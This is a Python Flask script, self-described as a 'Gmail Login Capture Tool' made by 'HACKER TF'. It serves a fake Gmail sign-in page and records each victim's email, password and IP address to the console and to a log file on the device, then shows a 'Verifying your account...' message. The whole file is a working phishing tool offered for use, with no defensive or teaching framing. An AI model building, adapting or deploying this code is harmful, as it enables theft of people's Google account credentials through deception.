from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
SAVE_PATH = "/sdcard/HackerTF"
LOG_FILE = os.path.join(SAVE_PATH, "log.txt")
os.makedirs(SAVE_PATH, exist_ok=True)

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Gmail</title>
    <style>
        body { font-family: 'Roboto', sans-serif; background: #f2f2f2; text-align: center; padding-top: 60px; }
        .box { background: white; padding: 30px; border-radius: 8px; width: 300px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input, button { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { background: #1a73e8; color: white; font-weight: bold; border: none; cursor: pointer; }
        img { width: 50px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico">
        <h2>Sign in</h2>
        <form method="POST" action="/login">
            <input type="email" name="username" placeholder="Email or phone" required><br>
            <input type="password" name="password" placeholder="Enter your password" required><br>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_template)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr

    log = f"""
[+] Gmail Login
IP: {ip}
Email: {username}
Password: {password}
----------------------------
"""
    print(log)
    with open(LOG_FILE, "a") as f:
        f.write(log)

    return "<h3>Verifying your account...</h3>"

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;31m" + "="*40)
    print("         Made by HACKER TF        ")
    print("       Gmail Login Capture Tool   ")
    print("="*40 + "\033[0m")
    print("Server running on: http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5780)